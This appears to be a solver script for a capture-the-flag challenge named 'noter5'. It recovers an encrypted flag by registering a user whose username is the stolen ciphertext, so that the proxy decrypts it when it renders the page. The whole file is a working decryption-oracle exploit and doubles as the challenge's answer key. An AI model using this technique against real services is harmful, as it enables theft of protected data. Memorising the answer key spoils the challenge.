#!/usr/bin/env python3
"""noter5 solver — recover the flag without ever decrypting AES ourselves.

The proxy encrypts note bodies before storing them in the backend and decrypts any
ENCRYPTED:... blob it finds in a response. Usernames are on its do-not-encrypt list.
So: grab the admin's encrypted flag note from /activity, register a new user whose
*username* is that ciphertext, and the proxy decrypts it back to the flag when it
renders the username.

Usage: python3 solution.py <proxy-url>     e.g. python3 solution.py http://localhost:1024
"""
import re
import sys
import requests

URL = (sys.argv[1] if len(sys.argv) > 1 else "http://localhost:1024").rstrip("/")


def main():
    # 1. A throwaway account, just to read the activity log through the proxy.
    scout = requests.Session()
    scout.post(f"{URL}/registerlogin", data={"username": "scout", "password": "x"})
    activity = scout.get(f"{URL}/activity").text

    # 2. The admin's "added note" line carries the encrypted flag, base64-wrapped
    #    (so the proxy doesn't decrypt it in place). Decode it to the ENCRYPTED:... blob.
    import base64
    blob = re.search(r"[A-Za-z0-9+/]{40,}={0,2}", activity).group(0)
    enc = base64.b64decode(blob).decode()
    assert enc.startswith("ENCRYPTED:"), enc

    # 3. Register a user whose username IS that ciphertext. Usernames aren't
    #    re-encrypted by the proxy, so the backend stores the raw ENCRYPTED:... .
    attacker = requests.Session()
    page = attacker.post(f"{URL}/registerlogin",
                         data={"username": enc, "password": "x"}).text

    # 4. The proxy decrypts the ENCRYPTED:... username when it renders the page.
    m = re.search(r"flag\{[^}]*\}", page) or re.search(
        r"flag\{[^}]*\}", attacker.get(f"{URL}/notes").text)
    print(m.group(0) if m else "flag not found")


if __name__ == "__main__":
    main()
